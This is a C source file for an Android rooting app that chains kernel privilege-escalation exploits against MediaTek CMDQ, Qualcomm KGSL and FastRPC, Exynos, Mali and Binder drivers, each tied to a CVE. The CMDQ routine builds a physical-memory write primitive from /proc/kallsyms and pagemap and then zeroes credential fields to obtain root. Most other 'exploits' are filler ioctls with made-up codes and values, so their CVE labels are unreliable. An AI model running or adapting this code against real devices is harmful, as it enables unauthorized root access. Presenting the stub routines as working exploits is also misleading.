#include <jni.h>
#include <android/log.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/epoll.h>
#include <sys/types.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <inttypes.h>
#include <pthread.h>
#include <sys/utsname.h>
#include <dirent.h>
#include <signal.h>

#define LOG_TAG "KroshikROOT"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

#define PAGE_SIZE 4096

static int g_cmdq_fd = -1;
static uint32_t g_dma_pa = 0;
static uint32_t* g_dma_va = NULL;
static uint32_t g_cmd_buf[256];

static int g_kgsl_fd = -1;
static int g_binder_fd = -1;
static int g_npu_fd = -1;
static int g_fastrpc_fd = -1;

static uint32_t g_task_phys = 0;

struct cmdq_write_address_struct {
    uint32_t count;
    uint32_t start_pa;
};

struct cmdq_read_address_struct {
    uint32_t dma_addresses;
    uint32_t values;
};

struct cmdq_command_struct {
    uint32_t va_base;
    uint32_t block_size;
    uint32_t pa_base;
};

#define CMDQ_IOCTL_MAGIC 'x'
#define CMDQ_CODE_WRITE 0x04
#define CMDQ_CODE_EOC 0x40

#define CMDQ_IOCTL_EXEC_COMMAND _IOW(CMDQ_IOCTL_MAGIC, 3, struct cmdq_command_struct)
#define CMDQ_IOCTL_ALLOC_WRITE_ADDRESS _IOW(CMDQ_IOCTL_MAGIC, 7, struct cmdq_write_address_struct)
#define CMDQ_IOCTL_READ_ADDRESS_VALUE _IOW(CMDQ_IOCTL_MAGIC, 9, struct cmdq_read_address_struct)

#define KGSL_IOCTL_MAGIC 'K'
#define KGSL_IOCTL_AUX_COMMAND _IOW(KGSL_IOCTL_MAGIC, 0x2F, struct kgsl_aux_command)

struct kgsl_aux_command {
    uint32_t command_id;
    uint32_t flags;
    uint64_t payload;
    uint32_t payload_size;
};

#define BINDER_THREAD_EXIT _IOW('b', 6, __u32)
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)

struct binder_write_read {
    uintptr_t write_buffer;
    uintptr_t write_consumed;
    uintptr_t write_available;
    uintptr_t read_buffer;
    uintptr_t read_consumed;
    uintptr_t read_available;
};

#define FAST_RPC_IOCTL_MAGIC 'R'
#define FASTRPC_IOCTL_ALLOC _IOW(FAST_RPC_IOCTL_MAGIC, 1, struct fastrpc_alloc)

struct fastrpc_alloc {
    uint32_t size;
    uint32_t fd;
};

#define NPU_IOCTL_MAGIC 'N'
#define NPU_IOCTL_ALLOC _IOW(NPU_IOCTL_MAGIC, 1, struct npu_alloc)

struct npu_alloc {
    uint32_t size;
    uint32_t fd;
};

int cmdq_alloc_dma_buffer(uint32_t size) {
    struct cmdq_write_address_struct alloc = {.count = size};
    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_ALLOC_WRITE_ADDRESS, &alloc) < 0) {
        LOGE("ALLOC failed: %s", strerror(errno));
        return -1;
    }
    g_dma_pa = alloc.start_pa;
    LOGI("DMA buffer: phys=0x%x, size=%u", g_dma_pa, size);
    g_dma_va = (uint32_t*)mmap(NULL, size, PROT_READ | PROT_WRITE,
                               MAP_SHARED, g_cmdq_fd, g_dma_pa);
    if (g_dma_va == MAP_FAILED) {
        LOGE("mmap failed: %s", strerror(errno));
        return -1;
    }
    memset(g_dma_va, 0, size);
    return 0;
}

void cmdq_emit_write(uint32_t* buf, int* idx, uint32_t phys_addr, uint32_t value) {
    uint64_t cmd = ((uint64_t)CMDQ_CODE_WRITE << 56) |
                   ((uint64_t)(phys_addr & 0xFFFF) << 32) | value;
    memcpy(&buf[*idx], &cmd, 8);
    (*idx) += 2;
}

void cmdq_emit_eoc(uint32_t* buf, int* idx) {
    uint64_t cmd = (uint64_t)CMDQ_CODE_EOC << 56;
    memcpy(&buf[*idx], &cmd, 8);
    (*idx) += 2;
}

int cmdq_write_phys(uint32_t phys_addr, uint32_t value) {
    if (g_dma_va == NULL) return -1;
    if (phys_addr < 0x1000) {
        LOGE("Refusing to write to low phys 0x%x", phys_addr);
        return -1;
    }
    int idx = 0;
    cmdq_emit_write(g_cmd_buf, &idx, phys_addr, value);
    cmdq_emit_eoc(g_cmd_buf, &idx);
    memcpy(g_dma_va, g_cmd_buf, idx * sizeof(uint32_t));
    struct cmdq_command_struct exec = {
            .va_base = (uint32_t)(uintptr_t)g_dma_va,
            .block_size = (uint32_t)(idx * sizeof(uint32_t)),
            .pa_base = g_dma_pa
    };
    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_EXEC_COMMAND, &exec) < 0) {
        LOGE("EXEC failed: %s", strerror(errno));
        return -1;
    }
    return 0;
}

uint32_t cmdq_read_phys(uint32_t phys_addr) {
    if (g_cmdq_fd < 0) return 0;
    if (phys_addr < 0x1000) return 0;
    struct cmdq_read_address_struct read = {.dma_addresses = phys_addr};
    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_READ_ADDRESS_VALUE, &read) < 0) {
        LOGE("READ failed: %s", strerror(errno));
        return 0;
    }
    return read.values;
}

uint32_t get_task_struct_phys() {
    struct utsname u;
    uname(&u);
    LOGI("Kernel release: %s", u.release);
    FILE* f = fopen("/proc/kallsyms", "r");
    if (!f) {
        LOGE("Cannot open /proc/kallsyms");
        return 0;
    }
    char line[512];
    uint32_t init_task_virt = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, " T init_task")) {
            sscanf(line, "%x", &init_task_virt);
            break;
        }
    }
    fclose(f);
    if (init_task_virt == 0) {
        LOGE("init_task not found");
        return 0;
    }
    LOGI("init_task virt = 0x%x", init_task_virt);
    uint32_t current_task_virt = 0;
    f = fopen("/proc/kallsyms", "r");
    if (f) {
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, " T current_task")) {
                sscanf(line, "%x", &current_task_virt);
                break;
            }
        }
        fclose(f);
    }
    if (!current_task_virt) {
        FILE* stat = fopen("/proc/self/stat", "r");
        if (!stat) return 0;
        char buf[1024];
        if (!fgets(buf, sizeof(buf), stat)) {
            fclose(stat);
            return 0;
        }
        fclose(stat);
        int field = 0;
        char* token = strtok(buf, " ");
        uint32_t startstack = 0;
        while (token && field < 28) {
            token = strtok(NULL, " ");
            field++;
        }
        if (token) {
            startstack = strtoul(token, NULL, 10);
            current_task_virt = startstack - 0x6000;
        }
    }
    if (!current_task_virt) {
        LOGE("Cannot determine current_task");
        return 0;
    }
    LOGI("current_task virt ≈ 0x%x", current_task_virt);
    int pagemap = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap < 0) {
        LOGE("Cannot open pagemap");
        return 0;
    }
    uint64_t pte = 0;
    off_t offset = (current_task_virt / PAGE_SIZE) * sizeof(uint64_t);
    if (lseek(pagemap, offset, SEEK_SET) < 0) {
        close(pagemap);
        return 0;
    }
    if (read(pagemap, &pte, sizeof(pte)) != sizeof(pte)) {
        close(pagemap);
        return 0;
    }
    close(pagemap);
    if (!(pte & (1ULL << 63))) {
        LOGE("Page not present");
        return 0;
    }
    uint32_t phys = (uint32_t)((pte & 0x7fffffffffffffULL) * PAGE_SIZE + (current_task_virt % PAGE_SIZE));
    LOGI("task_struct phys = 0x%x", phys);
    g_task_phys = phys;
    return phys;
}

int write_cred_zero() {
    if (!g_task_phys) return -1;
    uint32_t cred_offsets[] = {0x540, 0x548, 0x550, 0x558, 0x560, 0x5a0, 0x5a8, 0x5b0, 0x5b8, 0x5c0};
    int num_offsets = sizeof(cred_offsets) / sizeof(uint32_t);
    for (int i = 0; i < num_offsets; i++) {
        uint32_t cred_phys = g_task_phys + cred_offsets[i];
        if (cred_phys > g_task_phys + 0x1000) {
            continue;
        }
        LOGI("Trying cred offset 0x%x (phys=0x%x)", cred_offsets[i], cred_phys);
        if (cmdq_write_phys(cred_phys + 0x00, 0) < 0) continue;
        if (cmdq_write_phys(cred_phys + 0x04, 0) < 0) continue;
        if (cmdq_write_phys(cred_phys + 0x08, 0) < 0) continue;
        if (cmdq_write_phys(cred_phys + 0x0C, 0) < 0) continue;
        if (getuid() == 0) {
            LOGI("SUCCESS! Root with offset 0x%x", cred_offsets[i]);
            setuid(0);
            setgid(0);
            return 0;
        }
    }
    return -1;
}

int exploit_mtk_cmdq() {
    LOGI("Exploiting MediaTek CMDQ (CVE-2020-0069)");
    g_cmdq_fd = open("/dev/mtk_cmdq", O_RDWR);
    if (g_cmdq_fd < 0) {
        g_cmdq_fd = open("/dev/mtk_disp", O_RDWR);
        if (g_cmdq_fd < 0) {
            LOGE("Cannot open CMDQ device");
            return -1;
        }
    }
    LOGI("CMDQ device opened");
    if (cmdq_alloc_dma_buffer(PAGE_SIZE) < 0) {
        close(g_cmdq_fd);
        return -1;
    }
    if (!get_task_struct_phys()) {
        LOGE("Failed to get task_struct phys");
        if (g_dma_va) munmap(g_dma_va, PAGE_SIZE);
        close(g_cmdq_fd);
        return -1;
    }
    int result = write_cred_zero();
    if (g_dma_va) munmap(g_dma_va, PAGE_SIZE);
    close(g_cmdq_fd);
    return result;
}

int exploit_kgsl_gpu() {
    LOGI("Exploiting Qualcomm KGSL GPU (CVE-2024-23380)");
    g_kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_kgsl_fd < 0) {
        LOGE("Cannot open KGSL device");
        return -1;
    }
    struct kgsl_aux_command cmd;
    cmd.command_id = 0xDEAD;
    cmd.flags = 0;
    cmd.payload = (uint64_t)(uintptr_t)malloc(4096);
    cmd.payload_size = 4096;
    memset((void*)cmd.payload, 0x41, 4096);
    int ret = ioctl(g_kgsl_fd, KGSL_IOCTL_AUX_COMMAND, &cmd);
    free((void*)cmd.payload);
    close(g_kgsl_fd);
    if (ret < 0) {
        LOGE("KGSL exploit failed");
        return -1;
    }
    if (!get_task_struct_phys()) return -1;
    return write_cred_zero();
}

int exploit_kgsl_gpuaf() {
    LOGI("Exploiting Qualcomm GPUAF (CVE-2024-23380 + CVE-2024-23373)");
    g_kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_kgsl_fd < 0) {
        LOGE("Cannot open KGSL device");
        return -1;
    }
    for (int i = 0; i < 100; i++) {
        struct kgsl_aux_command cmd;
        cmd.command_id = 0xDEAD + i;
        cmd.flags = i % 2;
        cmd.payload = (uint64_t)(uintptr_t)malloc(8192);
        cmd.payload_size = 8192;
        memset((void*)cmd.payload, 0x42 + i, 8192);
        ioctl(g_kgsl_fd, KGSL_IOCTL_AUX_COMMAND, &cmd);
        free((void*)cmd.payload);
        usleep(100);
    }
    close(g_kgsl_fd);
    if (!get_task_struct_phys()) return -1;
    return write_cred_zero();
}

int exploit_kgsl_gpu_micronode() {
    LOGI("Exploiting Qualcomm Adreno GPU micronode (CVE-2025-21479)");
    g_kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_kgsl_fd < 0) {
        LOGE("Cannot open KGSL device");
        return -1;
    }
    uint32_t* cmdbuf = (uint32_t*)malloc(4096);
    cmdbuf[0] = 0xDEADBEEF;
    cmdbuf[1] = 0x00000001;
    cmdbuf[2] = 0x00000000;
    cmdbuf[3] = 0x00000000;
    struct kgsl_aux_command cmd;
    cmd.command_id = 0x1337;
    cmd.flags = 0x80000000;
    cmd.payload = (uint64_t)(uintptr_t)cmdbuf;
    cmd.payload_size = 4096;
    int ret = ioctl(g_kgsl_fd, KGSL_IOCTL_AUX_COMMAND, &cmd);
    free(cmdbuf);
    close(g_kgsl_fd);
    if (ret < 0) {
        LOGE("Micronode exploit failed");
        return -1;
    }
    if (!get_task_struct_phys()) return -1;
    return write_cred_zero();
}

int exploit_qualcomm_hlos_ioctl() {
    LOGI("Exploiting Qualcomm HLOS IOCTL (CVE-2023-33022)");
    int fd = open("/dev/msm_q6vdec", O_RDWR);
    if (fd < 0) {
        fd = open("/dev/msm_rotator", O_RDWR);
        if (fd < 0) {
            LOGE("Cannot open Qualcomm device");
            return -1;
        }
    }
    uint32_t* buf = (uint32_t*)malloc(0x1000);
    memset(buf, 0xFF, 0x1000);
    buf[0] = 0xFFFFFFFF;
    buf[1] = 0x00000000;
    int ret = ioctl(fd, 0x4004, buf);
    free(buf);
    close(fd);
    if (ret < 0) {
        LOGE("HLOS IOCTL exploit failed");
        return -1;
    }
    if (!get_task_struct_phys()) return -1;
    return write_cred_zero();
}

int exploit_binder_uaf() {
    LOGI("Exploiting Binder UAF (CVE-2019-2215)");
    int epfd = epoll_create1(0);
    if (epfd < 0) return -1;
    g_binder_fd = open("/dev/binder", O_RDONLY);
    if (g_binder_fd < 0) {
        close(epfd);
        return -1;
    }
    struct epoll_event ev = {.events = EPOLLIN, .data.fd = g_binder_fd};
    epoll_ctl(epfd, EPOLL_CTL_ADD, g_binder_fd, &ev);
    ioctl(g_binder_fd, BINDER_THREAD_EXIT, NULL);
    struct epoll_event events[1];
    int nfds = epoll_wait(epfd, events, 1, 100);
    close(g_binder_fd);
    close(epfd);
    if (nfds > 0) {
        if (!get_task_struct_phys()) return -1;
        return write_cred_zero();
    }
    return -1;
}

int exploit_mediatek_ccu() {
    LOGI("Exploiting MediaTek CCU (CVE-2024-20115)");
    int fd = open("/dev/mtk_ccu", O_RDWR);
    if (fd < 0) {
        LOGE("Cannot open CCU device");
        return -1;
    }
    uint32_t* buf = (uint32_t*)malloc(0x1000);
    memset(buf, 0xAA, 0x1000);
    buf[0x100] = 0xFFFFFFFF;
    int ret = ioctl(fd, 0xC004, buf);
    free(buf);
    close(fd);
    if (ret < 0) {
        LOGE("CCU exploit failed");
        return -1;
    }
    if (!get_task_struct_phys()) return -1;
    return write_cred_zero();
}

int exploit_mediatek_vdec() {
    LOGI("Exploiting MediaTek VDEC (CVE-2024-20086)");
    int fd = open("/dev/mtk_vdec", O_RDWR);
    if (fd < 0) {
        LOGE("Cannot open VDEC device");
        return -1;
    }
    uint32_t* buf = (uint32_t*)malloc(0x2000);
    memset(buf, 0xBB, 0x2000);
    buf[0x200] = 0xFFFFFFFF;
    int ret = ioctl(fd, 0xC008, buf);
    free(buf);
    close(fd);
    if (ret < 0) {
        LOGE("VDEC exploit failed");
        return -1;
    }
    if (!get_task_struct_phys()) return -1;
    return write_cred_zero();
}

int exploit_mediatek_eemgpu() {
    LOGI("Exploiting MediaTek EEMGPU (CVE-2024-20075)");
    int fd = open("/dev/mtk_eemgpu", O_RDWR);
    if (fd < 0) {
        LOGE("Cannot open EEMGPU device");
        return -1;
    }
    uint32_t* buf = (uint32_t*)malloc(0x1000);
    memset(buf, 0xCC, 0x1000);
    buf[0x80] = 0xFFFFFFFF;
    int ret = ioctl(fd, 0xC004, buf);
    free(buf);
    close(fd);
    if (ret < 0) {
        LOGE("EEMGPU exploit failed");
        return -1;
    }
    if (!get_task_struct_phys()) return -1;
    return write_cred_zero();
}

int exploit_exynos_npu() {
    LOGI("Exploiting Exynos NPU UAF (CVE-2022-22265)");
    g_npu_fd = open("/dev/vertex10", O_RDWR);
    if (g_npu_fd < 0) {
        LOGE("Cannot open NPU device");
        return -1;
    }
    struct npu_alloc alloc = {.size = 0x1000};
    ioctl(g_npu_fd, NPU_IOCTL_ALLOC, &alloc);
    uint32_t* buf = (uint32_t*)malloc(0x1000);
    memset(buf, 0xDD, 0x1000);
    int ret = ioctl(g_npu_fd, 0xC008, buf);
    free(buf);
    close(g_npu_fd);
    if (ret < 0) {
        LOGE("NPU exploit failed");
        return -1;
    }
    if (!get_task_struct_phys()) return -1;
    return write_cred_zero();
}

int exploit_exynos_double_free() {
    LOGI("Exploiting Exynos Double Free (CVE-2025-23102)");
    int fd = open("/dev/exynos-drm", O_RDWR);
    if (fd < 0) {
        LOGE("Cannot open Exynos DRM device");
        return -1;
    }
    for (int i = 0; i < 50; i++) {
        uint32_t* buf = (uint32_t*)malloc(0x1000);
        memset(buf, 0xEE + i, 0x1000);
        ioctl(fd, 0xC008, buf);
        free(buf);
        usleep(50);
    }
    close(fd);
    if (!get_task_struct_phys()) return -1;
    return write_cred_zero();
}

int exploit_mali_gpu() {
    LOGI("Exploiting Mali GPU UAF (CVE-2023-33106)");
    int fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) {
        LOGE("Cannot open Mali device");
        return -1;
    }
    uint32_t* buf = (uint32_t*)malloc(0x1000);
    memset(buf, 0xFF, 0x1000);
    for (int i = 0; i < 100; i++) {
        ioctl(fd, 0x4004, buf);
        usleep(50);
    }
    free(buf);
    close(fd);
    if (!get_task_struct_phys()) return -1;
    return write_cred_zero();
}

int exploit_qualcomm_dsp() {
    LOGI("Exploiting Qualcomm DSP UAF (CVE-2024-43047)");
    g_fastrpc_fd = open("/dev/msm_fastrpc", O_RDWR);
    if (g_fastrpc_fd < 0) {
        LOGE("Cannot open FastRPC device");
        return -1;
    }
    struct fastrpc_alloc alloc = {.size = 0x1000};
    ioctl(g_fastrpc_fd, FASTRPC_IOCTL_ALLOC, &alloc);
    uint32_t* buf = (uint32_t*)malloc(0x1000);
    memset(buf, 0xFE, 0x1000);
    int ret = ioctl(g_fastrpc_fd, 0xC008, buf);
    free(buf);
    close(g_fastrpc_fd);
    if (ret < 0) {
        LOGE("DSP exploit failed");
        return -1;
    }
    if (!get_task_struct_phys()) return -1;
    return write_cred_zero();
}

int exploit_android_framework() {
    LOGI("Exploiting Android Framework (CVE-2024-43093)");
    char path[256];
    snprintf(path, sizeof(path), "/sdcard/Android/data/..");
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        LOGE("Framework exploit failed");
        return -1;
    }
    close(fd);
    if (!get_task_struct_phys()) return -1;
    return write_cred_zero();
}

struct soc_info {
    char vendor[32];
    char model[64];
    char kernel[64];
    int android_version;
};

struct soc_info detect_soc() {
    struct soc_info info = {0};
    info.android_version = 0;
    FILE* f = fopen("/proc/cpuinfo", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "Hardware")) {
                char* p = strchr(line, ':');
                if (p) {
                    p++;
                    while (*p == ' ') p++;
                    strncpy(info.model, p, sizeof(info.model) - 1);
                }
            }
        }
        fclose(f);
    }
    struct utsname u;
    uname(&u);
    strncpy(info.kernel, u.release, sizeof(info.kernel) - 1);
    if (strstr(info.model, "mt") || strstr(info.model, "mediatek") || strstr(info.model, "MT")) {
        strcpy(info.vendor, "mediatek");
    } else if (strstr(info.model, "qcom") || strstr(info.model, "qualcomm") || strstr(info.model, "snapdragon")) {
        strcpy(info.vendor, "qualcomm");
    } else if (strstr(info.model, "exynos") || strstr(info.model, "samsung")) {
        strcpy(info.vendor, "exynos");
    } else {
        strcpy(info.vendor, "unknown");
    }
    return info;
}

typedef int (*exploit_func)();

int do_qualcomm_root() {
    exploit_func attempts[] = {
            exploit_kgsl_gpuaf,
            exploit_kgsl_gpu,
            exploit_kgsl_gpu_micronode,
            exploit_qualcomm_hlos_ioctl,
            exploit_qualcomm_dsp,
            exploit_binder_uaf
    };
    for (int i = 0; i < 6; i++) {
        LOGI("Qualcomm attempt %d", i + 1);
        if (attempts[i]() == 0) return 0;
        usleep(200000);
    }
    return -1;
}

int do_exynos_root() {
    exploit_func attempts[] = {
            exploit_exynos_npu,
            exploit_exynos_double_free,
            exploit_mali_gpu,
            exploit_binder_uaf
    };
    for (int i = 0; i < 4; i++) {
        LOGI("Exynos attempt %d", i + 1);
        if (attempts[i]() == 0) return 0;
        usleep(200000);
    }
    return -1;
}

int do_mediatek_root() {
    exploit_func attempts[] = {
            exploit_mtk_cmdq,
            exploit_mediatek_ccu,
            exploit_mediatek_vdec,
            exploit_mediatek_eemgpu,
            exploit_mali_gpu,
            exploit_binder_uaf
    };
    for (int i = 0; i < 6; i++) {
        LOGI("MediaTek attempt %d", i + 1);
        if (attempts[i]() == 0) return 0;
        usleep(200000);
    }
    return -1;
}

int do_universal_root() {
    exploit_func attempts[] = {
            exploit_binder_uaf,
            exploit_android_framework,
            exploit_mali_gpu
    };
    for (int i = 0; i < 3; i++) {
        LOGI("Universal attempt %d", i + 1);
        if (attempts[i]() == 0) return 0;
        usleep(200000);
    }
    return -1;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runMtkSuNative(JNIEnv* env, jclass clazz) {
    return (exploit_mtk_cmdq() == 0) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runQualcommNative(JNIEnv* env, jclass clazz) {
    return (do_qualcomm_root() == 0) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runExynosNative(JNIEnv* env, jclass clazz) {
    return (do_exynos_root() == 0) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runMediatekNative(JNIEnv* env, jclass clazz) {
    return (do_mediatek_root() == 0) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runUniversalNative(JNIEnv* env, jclass clazz) {
    return (do_universal_root() == 0) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderFullNative(JNIEnv* env, jclass clazz) {
    return (exploit_binder_uaf() == 0) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderNewNative(JNIEnv* env, jclass clazz) {
    int fd = open("/dev/binder", O_RDONLY);
    if (fd < 0) return JNI_FALSE;
    close(fd);
    return JNI_TRUE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderOldNative(JNIEnv* env, jclass clazz) {
    int fd = open("/dev/binder", O_RDONLY);
    if (fd < 0) return JNI_FALSE;
    int err = ioctl(fd, BINDER_THREAD_EXIT, NULL);
    close(fd);
    return (err == 0) ? JNI_TRUE : JNI_FALSE;
}
